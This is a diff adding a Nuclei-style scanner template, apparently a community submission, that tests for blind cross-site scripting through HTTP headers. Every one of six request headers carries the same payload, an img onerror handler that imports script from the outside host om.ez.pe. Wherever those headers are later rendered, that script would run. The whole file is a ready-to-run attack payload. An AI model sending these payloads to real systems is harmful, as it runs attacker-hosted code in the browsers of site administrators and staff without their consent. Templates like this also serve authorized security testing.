@@ -1,0 +1,26 @@
+id: blindxss
+
+info:
+  name: blindxss via header
+  author: omkar7505
+  severity: high
+  description: blindxss via header
+  tags: ssrf,oast,nextjs
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        Referer: "><img src onerror=import('//om.ez.pe')>
+        Origin: "><img src onerror=import('//om.ez.pe')>
+        Cookie: "><img src onerror=import('//om.ez.pe')>
+        Accept: "><img src onerror=import('//om.ez.pe')>
+        X-Forwarded-For: "><img src onerror=import('//om.ez.pe')>
+        User-Agent: "><img src onerror=import('//om.ez.pe')>
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "om.ez.pe"
